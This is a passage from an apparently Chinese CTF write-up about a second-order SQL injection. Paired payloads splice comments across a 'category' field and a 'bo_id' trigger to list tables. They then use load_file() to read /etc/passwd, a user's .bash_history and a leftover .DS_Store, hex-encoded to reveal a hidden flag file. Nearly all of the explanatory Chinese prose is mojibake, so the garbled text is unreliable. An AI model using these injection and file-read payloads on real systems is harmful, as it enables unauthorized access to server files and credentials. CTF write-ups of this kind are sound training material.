alt="image-20240208204226712"></p><h5 id="åˆ©ç”¨ä»æ•°æ®åº“é‡æ–°æå–çš„æ•°æ®ï¼Œè¿›è¡Œæ³¨å…¥"><a href="#åˆ©ç”¨ä»æ•°æ®åº“é‡æ–°æå–çš„æ•°æ®ï¼Œè¿›è¡Œæ³¨å…¥" class="headerlink" title="åˆ©ç”¨ä»æ•°æ®åº“é‡æ–°æå–çš„æ•°æ®ï¼Œè¿›è¡Œæ³¨å…¥:"></a>åˆ©ç”¨ä»æ•°æ®åº“é‡æ–°æå–çš„æ•°æ®ï¼Œè¿›è¡Œæ³¨å…¥:</h5><h6 id="payload2"><a href="#payload2" class="headerlink" title="payload2:"></a>payload2:</h6><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">content=*/#&amp;bo_id=6<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240208204404395.png" alt="image-20240208204404395"></p><p><img src="/images/2024-2-18/image-20240208204413754.png" alt="image-20240208204413754"></p><p>æˆåŠŸè·å–åˆ°æ•°æ®åº“ä¿¡æ¯ä¸ºctf</p><h4 id="æŸ¥çœ‹è¡¨ä¿¡æ¯"><a href="#æŸ¥çœ‹è¡¨ä¿¡æ¯" class="headerlink" title="æŸ¥çœ‹è¡¨ä¿¡æ¯:"></a>æŸ¥çœ‹è¡¨ä¿¡æ¯:</h4><h5 id="payload1"><a href="#payload1" class="headerlink" title="payload1:"></a>payload1:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">title=south&amp;category=123&#x27;,content=(select(group_concat(table_name))from(information_schema.tables)where((table_schema)=(database()))),/*&amp;content=666<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240208211027230.png" alt="image-20240208211027230"></p><h5 id="payload2-1"><a href="#payload2-1" class="headerlink" title="payload2:"></a>payload2:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">content=*/#&amp;bo_id=7<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240208211058023.png" alt="image-20240208211058023"></p><p>çœ‹äº†å…¶ä»–å¸ˆå‚…çš„wpçŸ¥é“flagå¹¶ä¸åœ¨æ•°æ®åº“ä¸­ï¼Œæˆ‘ä»¬éœ€è¦å¯¹ç½‘é¡µçš„æ–‡ä»¶ä¿¡æ¯è¿›è¡Œè·å–ã€‚</p><h2 id="è·å–ç½‘é¡µçš„è´¦æˆ·ä¿¡æ¯"><a href="#è·å–ç½‘é¡µçš„è´¦æˆ·ä¿¡æ¯" class="headerlink" title="è·å–ç½‘é¡µçš„è´¦æˆ·ä¿¡æ¯:"></a>è·å–ç½‘é¡µçš„è´¦æˆ·ä¿¡æ¯:</h2><h3 id="etc-passwdï¼š"><a href="#etc-passwdï¼š" class="headerlink" title="&#x2F;etc&#x2F;passwdï¼š"></a>&#x2F;etc&#x2F;passwdï¼š</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs txt">ç”¨äºå­˜å‚¨ç”¨æˆ·è´¦æˆ·ä¿¡æ¯çš„æ–‡ä»¶ã€‚å®ƒåŒ…å«äº†ç³»ç»Ÿä¸­æ‰€æœ‰ç”¨æˆ·è´¦æˆ·çš„åŸºæœ¬ä¿¡æ¯ï¼Œæ¯è¡Œå¯¹åº”ä¸€ä¸ªç”¨æˆ·è´¦æˆ·ï¼Œè®°å½•äº†è¯¥ç”¨æˆ·çš„ç”¨æˆ·åã€åŠ å¯†åçš„å¯†ç ï¼ˆé€šå¸¸æ˜¯ &quot;x&quot;ï¼Œå®é™…å¯†ç ä¿å­˜åœ¨ /etc/shadow æ–‡ä»¶ä¸­ï¼‰ã€ç”¨æˆ· IDï¼ˆUIDï¼‰ã€ç»„ IDï¼ˆGIDï¼‰ã€ç”¨æˆ·æè¿°ä¿¡æ¯ã€ä¸»ç›®å½•ä»¥åŠé»˜è®¤çš„ shell ç­‰ä¿¡æ¯ã€‚<br><br>æ‰€ä»¥é‡Œé¢è´¦æˆ·ä¿¡æ¯çš„æ ¼å¼ä¸€èˆ¬ä¸ºä¸ƒä¸ªå­—æ®µï¼Œåˆ†åˆ«è¡¨ç¤ºï¼š<br>(root:x:0:0:root:/root:/bin/bash)<br>1.ç”¨æˆ·åï¼ˆusernameï¼‰ï¼šåœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œç”¨æˆ·åä¸º rootã€‚<br>2.å¯†ç å å‘ç¬¦ï¼ˆpassword placeholderï¼‰ï¼šåœ¨è¿™é‡Œå®é™…ä¸Šæ˜¯ xï¼Œè¡¨ç¤ºå¯†ç å·²ç»è¢«ç§»åŠ¨åˆ°äº† /etc/shadow æ–‡ä»¶ä¸­è¿›è¡Œç®¡ç†ã€‚<br>3.ç”¨æˆ· IDï¼ˆUIDï¼‰ï¼šç”¨æˆ·çš„æ•°å­—æ ‡è¯†ç¬¦ã€‚åœ¨è¿™é‡Œï¼Œ0 è¡¨ç¤º root ç”¨æˆ·æ‹¥æœ‰ç³»ç»Ÿä¸Šæœ€é«˜çš„æƒé™çº§åˆ«ï¼ˆè¶…çº§ç”¨æˆ·ï¼‰ã€‚<br>4.ç»„ IDï¼ˆGIDï¼‰ï¼šç”¨æˆ·æ‰€å±çš„ä¸»ç»„çš„æ•°å­—æ ‡è¯†ç¬¦ï¼Œåœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ0 ä»£è¡¨è¯¥ç”¨æˆ·æ‰€å±äºçš„ä¸»ç»„æ˜¯ rootã€‚<br>5.ç”¨æˆ·ä¿¡æ¯ï¼ˆuser informationï¼‰ï¼šé€šå¸¸åŒ…å«ç”¨æˆ·å…¨åã€è”ç³»æ–¹å¼ç­‰ä¿¡æ¯ï¼Œä½†åœ¨è¿™é‡Œæ˜¯ /rootï¼Œè¡¨ç¤ºè¯¥ç”¨æˆ·çš„å®¶ç›®å½•åœ¨ /root ç›®å½•ä¸‹ã€‚<br>6.Shell ç¨‹åºï¼ˆshell programï¼‰ï¼šå½“è¯¥ç”¨æˆ·ç™»å½•åæ‰€ä½¿ç”¨çš„é»˜è®¤ shellï¼Œè¿™é‡Œæ˜¯ /bin/bashï¼Œè¡¨ç¤ºè¯¥ç”¨æˆ·ç™»å½•åä¼šè¿›å…¥ Bash shell ç»ˆç«¯ç¨‹åºã€‚<br>7.å…¶ä»–ï¼ˆcomment/otherï¼‰ï¼šè¿™ä¸ªå­—æ®µé€šå¸¸è¢«å¿½ç•¥ï¼Œç”¨äºå­˜å‚¨å…³äºè¯¥ç”¨æˆ·çš„å¤‡æ³¨ä¿¡æ¯ã€‚<br>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ¯è¡Œè®°å½•éƒ½ä»¥æ¢è¡Œç¬¦ç»“å°¾ã€‚/etc/passwd æ–‡ä»¶ä¸­çš„æ¯ä¸€è¡Œéƒ½å¯¹åº”ç€ä¸€ä¸ªç”¨æˆ·è´¦æˆ·ã€‚è¿™ä¸ªæ–‡ä»¶é€šå¸¸åªèƒ½ç”±ç®¡ç†å‘˜æˆ–è€…è¶…çº§ç”¨æˆ·è®¿é—®å’Œä¿®æ”¹ï¼Œå› ä¸ºå®ƒåŒ…å«äº†ç³»ç»Ÿä¸Šæ‰€æœ‰ç”¨æˆ·çš„æ•æ„Ÿä¿¡æ¯ã€‚<br></code></pre></td></tr></table></figure><h3 id="payload1-1"><a href="#payload1-1" class="headerlink" title="payload1:"></a>payload1:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">title=south&amp;category=123&#x27;,content=(select(load_file(&quot;/etc/passwd&quot;))),/*&amp;content=666<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240208212651712.png" alt="image-20240208212651712"></p><h3 id="payload2-2"><a href="#payload2-2" class="headerlink" title="payload2:"></a>payload2:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">content=*/#&amp;bo_id=8<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240208212737550.png" alt="image-20240208212737550"></p><h3 id="çŸ¥è¯†ç‚¹ä»‹ç»1"><a href="#çŸ¥è¯†ç‚¹ä»‹ç»1" class="headerlink" title="çŸ¥è¯†ç‚¹ä»‹ç»1:"></a>çŸ¥è¯†ç‚¹ä»‹ç»1:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs txt">æˆ‘ä»¬é€šè¿‡å¯¹è´¦æˆ·ä¿¡æ¯çš„æŸ¥æ‰¾ï¼Œå°±å¯ä»¥å»å¯»æ‰¾å…³äºwwwç”¨æˆ·çš„ç›¸å…³ä¿¡æ¯<br>wwwç”¨æˆ·ï¼ˆç®€å•æ¥è®²å°±æ˜¯åœ¨wwwæ–‡ä»¶å¤¹ä¸‹æ“ä½œçš„ç”¨æˆ·ï¼Œåˆæˆ–è€…å¯ä»¥è¯´æ˜¯ç”¨æˆ·åœ¨wwwæ–‡ä»¶å¤¹ä¸‹æ“ä½œï¼‰:<br>www ç”¨æˆ·æ˜¯ä¸€ä¸ªå¸¸è§çš„ç”¨æˆ·è´¦æˆ·åç§°ï¼Œé€šå¸¸ç”¨äºè¿è¡Œ Web æœåŠ¡å™¨è¿›ç¨‹ï¼ˆå¦‚ Apacheã€Nginx ç­‰ï¼‰ã€‚è¿™ä¸ªç”¨æˆ·è´¦æˆ·æ˜¯ä¸ºäº†æä¾› Web æœåŠ¡è€Œåˆ›å»ºçš„ï¼Œå¹¶ä¸”å…·æœ‰é€‚å½“çš„æƒé™å’Œé™åˆ¶ï¼Œä»¥ç¡®ä¿æœåŠ¡å™¨çš„å®‰å…¨æ€§ã€‚<br><br>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œwww ç”¨æˆ·è´¦æˆ·å…·æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š<br><br>ç”¨æˆ·åï¼šwww æˆ– www-dataï¼Œå…·ä½“åç§°å¯èƒ½å› æ“ä½œç³»ç»Ÿå’Œé…ç½®è€Œå¼‚ã€‚<br>ç”¨æˆ·ç»„ï¼šé€šå¸¸ä¼šåˆ›å»ºä¸€ä¸ªä¸ç”¨æˆ·åç›¸åŒçš„ç”¨æˆ·ç»„ï¼Œä¾‹å¦‚ www æˆ– www-data ç»„ã€‚<br>ä¸»ç›®å½•ï¼šå¯èƒ½æ˜¯ç©ºçš„æˆ–è€…æ˜¯ /var/www æˆ–å…¶ä»–ç”¨äºå­˜å‚¨ç½‘ç«™æ–‡ä»¶çš„ç›®å½•ã€‚<br>Shellï¼šåœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œè¯¥ç”¨æˆ·è´¦æˆ·è¢«è®¾ç½®ä¸ºæ— æ³•ç™»å½•ï¼Œå³ä¸å…è®¸äº¤äº’å¼ç™»å½•ã€‚<br>æƒé™ï¼šwww ç”¨æˆ·é€šå¸¸åªæœ‰å¯¹ç½‘ç«™æ–‡ä»¶å’Œç›¸å…³èµ„æºçš„è¯»å–ã€æ‰§è¡Œæƒé™ï¼Œè€Œæ²¡æœ‰å†™å…¥æƒé™ã€‚è¿™æ ·å¯ä»¥é™åˆ¶å¯¹æœåŠ¡å™¨çš„è®¿é—®å’Œæ½œåœ¨çš„å®‰å…¨é£é™©ã€‚<br>é€šè¿‡å°† Web æœåŠ¡å™¨è¿›ç¨‹ç»‘å®šåˆ° www ç”¨æˆ·è´¦æˆ·ï¼Œå¯ä»¥é™ä½è¢«å…¥ä¾µçš„é£é™©ï¼Œå› ä¸ºå®ƒæœ€å¤§ç¨‹åº¦åœ°å‡å°‘äº†å¯¹ç³»ç»Ÿçš„è®¿é—®æƒé™ã€‚åŒæ—¶ï¼Œè¿™ä¹Ÿæœ‰åŠ©äºéš”ç¦» Web æœåŠ¡å™¨çš„è¿›ç¨‹å’Œæ–‡ä»¶ç³»ç»Ÿï¼Œæä¾›æ›´å¥½çš„å®‰å…¨æ€§å’Œå¯ç»´æŠ¤æ€§ã€‚<br></code></pre></td></tr></table></figure><p><strong>ç”±äºæˆ‘ä»¬è¦è·å–çš„æ˜¯ç½‘ç«™çš„å†…éƒ¨ä¿¡æ¯æ–‡ä»¶ï¼Œè€Œwwwç”¨æˆ·æ˜¯å¯¹ç½‘ç«™çš„æ“ä½œç”¨æˆ·ï¼Œæ‰€ä»¥çŸ¥é“å®ƒæ‰€åœ¨çš„ç›®å½•ä½ç½®å°±å¯ä»¥å¯¹ç½‘ç«™çš„æ–‡ä»¶ä¿¡æ¯è¿›è¡Œè·å–äº†</strong></p><h3 id="æ ¹æ®-etc-passwdï¼š"><a href="#æ ¹æ®-etc-passwdï¼š" class="headerlink" title="æ ¹æ®&#x2F;etc&#x2F;passwdï¼š"></a>æ ¹æ®&#x2F;etc&#x2F;passwdï¼š</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">www:x:500:500:www:/home/www:/bin/bash<br></code></pre></td></tr></table></figure><p>å¯ä»¥ç¡®å®šwwwç½‘ç«™æ“ä½œç”¨æˆ·çš„ä¿¡æ¯åœ¨&#x2F;home&#x2F;wwwä¸‹</p><h3 id="çŸ¥è¯†ç‚¹ä»‹ç»2ï¼š"><a href="#çŸ¥è¯†ç‚¹ä»‹ç»2ï¼š" class="headerlink" title="çŸ¥è¯†ç‚¹ä»‹ç»2ï¼š"></a>çŸ¥è¯†ç‚¹ä»‹ç»2ï¼š</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs txt">æ¯ä¸ªåœ¨ç³»ç»Ÿä¸­æ‹¥æœ‰è´¦å·çš„ç”¨æˆ·åœ¨ä»–çš„ç›®å½•ä¸‹éƒ½æœ‰ä¸€ä¸ªâ€œ.bash_historyâ€æ–‡ä»¶ï¼Œä¿å­˜äº†å½“å‰ç”¨æˆ·ä½¿ç”¨è¿‡çš„å†å²å‘½ä»¤ï¼Œæ–¹ä¾¿æŸ¥æ‰¾ã€‚<br>.bash_history æ–‡ä»¶æ˜¯ä¸€ä¸ª Bash shell çš„å†å²å‘½ä»¤è®°å½•æ–‡ä»¶ï¼Œè®°å½•äº†ç”¨æˆ·åœ¨ Bash ç»ˆç«¯ä¸­è¾“å…¥çš„æ‰€æœ‰å‘½ä»¤ã€‚æ¯å½“ç”¨æˆ·åœ¨ Bash ç»ˆç«¯ä¸­æ‰§è¡Œä¸€ä¸ªå‘½ä»¤ï¼Œè¿™ä¸ªå‘½ä»¤å°±ä¼šè¢«ä¿å­˜åˆ° .bash_history æ–‡ä»¶ä¸­ã€‚è¿™æ ·ï¼Œç”¨æˆ·å¯ä»¥æŸ¥çœ‹ã€ç¼–è¾‘ã€é‡å¤æ‰§è¡Œä»¥å‰æ‰§è¡Œè¿‡çš„å‘½ä»¤ã€‚<br><br>.bash_history æ–‡ä»¶é€šå¸¸å­˜å‚¨åœ¨ç”¨æˆ·çš„ home ç›®å½•ä¸‹ï¼Œä¾‹å¦‚ Linux ç³»ç»Ÿä¸‹ /home/username/.bash_historyï¼ŒmacOS ç³»ç»Ÿä¸‹ /Users/username/.bash_historyã€‚ç”¨æˆ·å¯ä»¥ä½¿ç”¨æ–‡æœ¬ç¼–è¾‘å™¨æ‰“å¼€è¿™ä¸ªæ–‡ä»¶è¿›è¡ŒæŸ¥çœ‹å’Œç¼–è¾‘ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ Bash shell æä¾›çš„ history å‘½ä»¤æ¥æŸ¥çœ‹å’Œæ“ä½œå†å²å‘½ä»¤ã€‚<br><br>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ.bash_history æ–‡ä»¶åŒ…å«äº†ç”¨æˆ·åœ¨ Bash ç»ˆç«¯ä¸­æ‰§è¡Œçš„æ‰€æœ‰å‘½ä»¤ï¼Œå› æ­¤å¯èƒ½åŒ…å«æ•æ„Ÿä¿¡æ¯ï¼ˆä¾‹å¦‚å¯†ç ç­‰ï¼‰ï¼ŒåŒæ—¶ç”±äºå†å²å‘½ä»¤è®°å½•çš„å­˜åœ¨ï¼Œä¹Ÿå¯èƒ½è¢«é»‘å®¢åˆ©ç”¨æ¥è¿›è¡Œæ”»å‡»ã€‚å› æ­¤ï¼Œä¸ºäº†ä¿æŠ¤ç”¨æˆ·çš„éšç§å’Œç³»ç»Ÿå®‰å…¨ï¼Œå»ºè®®å®šæœŸæ¸…ç† .bash_history æ–‡ä»¶ï¼Œæˆ–è€…ç¦ç”¨å†å²å‘½ä»¤è®°å½•åŠŸèƒ½ã€‚<br></code></pre></td></tr></table></figure><p>é€šè¿‡æŸ¥çœ‹è¯¥æ–‡ä»¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥çŸ¥é“webæ“ä½œç”¨æˆ·çš„å†å²æ“ä½œï¼Œä»è€ŒçŸ¥é“è¯¥ç”¨æˆ·æ‰€ä½¿ç”¨è¿‡çš„æ–‡ä»¶</p><h4 id="payload1-2"><a href="#payload1-2" class="headerlink" title="payload1:"></a>payload1:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">title=south&amp;category=123&#x27;,content=(select(load_file(&quot;/home/www/.bash_history&quot;))),/*&amp;content=666<br></code></pre></td></tr></table></figure><h4 id="payload2-3"><a href="#payload2-3" class="headerlink" title="payload2:"></a>payload2:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">content=*/#&amp;bo_id=9<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240208220114550.png" alt="image-20240208220114550"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs txt">cd /tmp/ #åˆ‡æ¢åˆ°tmpç›®å½•ä¸‹<br>unzip html.zip #è§£å‹ç¼©html.zipæ–‡ä»¶<br>rm -f html.zip #å¼ºåˆ¶åˆ é™¤html.zipæ–‡ä»¶<br>cp -r html /var/www/ #å°†htmlç›®å½•å¤åˆ¶åˆ°/var/www/=&gt;å½¢æˆ/var/www/html/<br>cd /var/www/html/ #åˆ‡æ¢åˆ°var/www/html/ç›®å½•ä¸‹<br>rm -f .DS_Store #å¼ºåˆ¶åˆ é™¤.DS_Store<br>service apache2 start #å¯åŠ¨apacheæœåŠ¡<br></code></pre></td></tr></table></figure><h4 id="åˆ†æï¼š"><a href="#åˆ†æï¼š" class="headerlink" title="åˆ†æï¼š"></a>åˆ†æï¼š</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt">html.zipä¸­çš„æ–‡ä»¶ï¼Œå°±æ˜¯wwwç”¨æˆ·ä¸Šä¼ åˆ°ç½‘é¡µä¸Šçš„æ–‡ä»¶å†…å®¹ï¼Œè™½ç„¶html.zipæ–‡ä»¶è¢«åˆ é™¤ï¼Œä½†æ˜¯åˆ‡æ¢åˆ°htmlæ–‡ä»¶å¤¹ä¸‹åï¼Œå…¶å®å°±æ˜¯é»˜è®¤ä¸ºä¸€ä¸ªhtmlç”¨æˆ·åœ¨htmlæ–‡ä»¶å¤¹ä¸‹è¿›è¡Œæ“ä½œè§£å‹html.zipä¸ºhtmlçš„è¿‡ç¨‹ä¸­ï¼Œä¼šåœ¨htmlæ–‡ä»¶ä¸­äº§ç”Ÿè§£å‹å†å²çš„æ–‡ä»¶.DS_Store,æ‰€ä»¥è¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆè¦åˆ‡æ¢åˆ°htmlç›®å½•ä¸‹åˆ é™¤.DS_Storeæ–‡ä»¶ï¼Œ<br><br>.DS_Store:(è‹±æ–‡å…¨ç§° Desktop Services Store)æ˜¯ä¸€ç§ç”±è‹¹æœå…¬å¸çš„Mac OS Xæ“ä½œç³»ç»Ÿæ‰€åˆ›é€ çš„éšè—æ–‡ä»¶ï¼Œç›®çš„åœ¨äºå­˜è´®ç›®å½•çš„è‡ªå®šä¹‰å±æ€§ï¼Œä¾‹å¦‚æ–‡ä»¶ä»¬çš„å›¾æ ‡ä½ç½®æˆ–è€…æ˜¯èƒŒæ™¯è‰²çš„é€‰æ‹©ã€‚é€šè¿‡.DS_Storeå¯ä»¥çŸ¥é“è¿™ä¸ªç›®å½•é‡Œé¢æ‰€æœ‰æ–‡ä»¶çš„æ¸…å•ã€‚<br><br>ä½†æ˜¯è¿™é‡Œç”¨æˆ·åªåˆ é™¤äº†htmlæ–‡ä»¶å¤¹ä¸‹çš„.DS_Storeæ–‡ä»¶ï¼Œè€Œhtmlæ–‡ä»¶æ˜¯åœ¨/tmp/ç›®å½•ä¸‹è§£å‹å¾—åˆ°çš„ï¼Œç„¶åå†å¤åˆ¶åˆ°/var/wwwä¸‹çš„ï¼Œæ‰€ä»¥/tmp/html/ç›®å½•ä¸‹è¿˜å­˜åœ¨.DS_Storeæ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥å¯¹å…¶è¿›è¡Œè·å–ã€‚<br></code></pre></td></tr></table></figure><h2 id="è·å–-tmp-html-ç›®å½•ä¸‹çš„-DS-Storeæ–‡ä»¶ï¼š"><a href="#è·å–-tmp-html-ç›®å½•ä¸‹çš„-DS-Storeæ–‡ä»¶ï¼š" class="headerlink" title="è·å–&#x2F;tmp&#x2F;html&#x2F;ç›®å½•ä¸‹çš„.DS_Storeæ–‡ä»¶ï¼š"></a>è·å–&#x2F;tmp&#x2F;html&#x2F;ç›®å½•ä¸‹çš„.DS_Storeæ–‡ä»¶ï¼š</h2><h3 id="paylaod1"><a href="#paylaod1" class="headerlink" title="paylaod1:"></a>paylaod1:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">title=south&amp;category=123&#x27;,content=(select(load_file(&quot;/tmp/html/.DS_Store&quot;))),/*&amp;content=666<br></code></pre></td></tr></table></figure><h3 id="payload2-4"><a href="#payload2-4" class="headerlink" title="payload2:"></a>payload2:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">content=*/#&amp;bo_id=12<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240208223425313.png" alt="image-20240208223425313"></p><p>å‘ç°æ–‡ä»¶å†…å®¹æ²¡æœ‰å®Œå…¨æ˜¾ç¤ºï¼Œå¯èƒ½æ˜¯ç”±äºæ–‡ä»¶å¤ªå¤§æˆ–å­˜åœ¨ä¹±ç ï¼Œä¸èƒ½å®Œå…¨æ˜¾ç¤ºï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨åå…­è¿›åˆ¶ç¼–ç è·å–æ–‡ä»¶ä¿¡æ¯</p><h2 id="ä½¿ç”¨16è¿›åˆ¶ç¼–ç è·å–æ–‡ä»¶ä¿¡æ¯"><a href="#ä½¿ç”¨16è¿›åˆ¶ç¼–ç è·å–æ–‡ä»¶ä¿¡æ¯" class="headerlink" title="ä½¿ç”¨16è¿›åˆ¶ç¼–ç è·å–æ–‡ä»¶ä¿¡æ¯:"></a>ä½¿ç”¨16è¿›åˆ¶ç¼–ç è·å–æ–‡ä»¶ä¿¡æ¯:</h2><h3 id="paylaod1-1"><a href="#paylaod1-1" class="headerlink" title="paylaod1:"></a>paylaod1:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">title=south&amp;category=123&#x27;,content=((select(hex(load_file(&quot;/tmp/html/.DS_Store&quot;))))),/*&amp;content=666<br></code></pre></td></tr></table></figure><h3 id="payload2-5"><a href="#payload2-5" class="headerlink" title="payload2:"></a>payload2:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">content=*/#&amp;bo_id=15<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240208224046928.png" alt="image-20240208224046928"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">00000001427564310000100000000800000010000000040A000000000000000000000000000000000000000000000800000008000000000000000000000000000000000000000002000000000000000B000000010000100000730074007200610070496C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000B000000090062006F006F007400730074007200610070496C6F63626C6F62000000100000004600000028FFFFFFFFFFFF00000000000B0063006F006D006D0065006E0074002E007000680070496C6F63626C6F6200000010000000CC0000002800000001FFFF000000000003006300730073496C6F63626C6F62000000100000015200000028FFFFFFFFFFFF0000000000190066006C00610067005F0038003900340036006500310066006600310065006500330065003400300066002E007000680070496C6F63626C6F6200000010000001D800000028FFFFFFFFFFFF0000000000050066006F006E00740073496C6F63626C6F62000000100000004600000098FFFFFFFFFFFF0000000000090069006E006400650078002E007000680070496C6F63626C6F6200000010000000CC0000009800000002FFFF000000000002006A0073496C6F63626C6F62000000100000015200000098FFFFFFFFFFFF000000000009006C006F00670069006E002E007000680070496C6F63626C6F6200000010000001D800000098FFFFFFFFFFFF000000000009006D007900730071006C002E007000680070496C6F63626C6F62000000100000004600000108FFFFFFFFFFFF00000000000600760065006E0064006F0072496C6F63626C6F6200000010000000CC00000108FFFFFFFFFFFF00000000000C00770072006900740065005F0064006F002E007000680070496C6F63626C6F62000000100000015200000108FFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000080B0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000